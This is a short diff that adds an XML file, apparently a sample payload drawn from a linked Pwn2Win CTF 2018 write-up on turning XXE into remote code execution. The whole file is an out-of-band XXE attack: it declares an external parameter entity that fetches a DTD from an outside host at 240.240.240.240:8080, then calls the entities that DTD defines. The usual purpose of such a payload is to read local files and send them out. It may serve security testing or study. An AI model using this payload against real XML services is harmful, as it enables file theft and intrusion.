@@ -1,0 +1,12 @@
+<!-- https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/ -->
+<?xml version="1.0" ?>
+<!DOCTYPE a [
+<!ENTITY % asd SYSTEM "http://240.240.240.240:8080/xxe_file.dtd">
+%asd;
+%c;
+]>
+<message>
+<id></id>
+<message>&rrr;</message>
+<title>xml</title>
+</message>
